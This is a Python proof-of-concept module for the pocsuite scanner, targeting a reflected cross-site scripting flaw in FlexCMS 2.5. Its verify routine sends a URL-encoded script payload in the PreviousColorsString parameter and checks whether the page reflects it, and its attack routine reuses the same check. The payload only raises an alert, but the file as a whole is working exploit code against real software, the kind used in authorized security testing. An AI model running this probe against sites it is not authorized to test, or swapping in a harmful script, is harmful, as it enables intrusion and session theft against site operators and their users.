#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from urlparse import urljoin

class TestPOC(POCBase):
    vulID = 'SSV-85553'  # vul ID
    version = '1'
    author = 'fenghh'
    vulDate = '2008-08-15'
    createDate = '2015-10-17'
    updateDate = '2015-10-17'
    references = ['https://www.exploit-db.com/exploits/32254/']
    name = "FlexCMS 2.5 - 'inc-core-admin-editor-previouscolorsjs.php' Cross-Site Scripting Vulnerability"
    appPowerLink = 'http://www.flexcms.com/'
    appName = 'FlexCMS'
    appVersion = '2.5'
    vulType = 'XSS'
    desc = '''  
        FlexCMS是一套网站内容管理系统。 
        FlexCMS 2.5以及之前的版本中的inc-core-admin-editor-previouscolorsjs.php存在跨站脚本攻击漏洞,
        当register_globals选项被激活时，远程攻击者可以借助reviousColorsString参数，
        注入任意的web脚本或HTML。
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        payload_xss = "/inc-core-admin-editor-previouscolorsjs.php?PreviousColorsString=%3Cscript%3Ealert(/SebugTest/)%3C/script%3E"
        res = req.get(urljoin(self.url, payload_xss), timeout=5)
        return self.parse_verify(res)

    def parse_verify(self, res):
        output = Output(self)
        result = {}
        if  '>alert(/SebugTest/)' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            output.success(result)           
        else:
            output.fail('Internet Nothing returned')
        return output

    def _attack(self): 
        return self._verify()
        
register(TestPOC)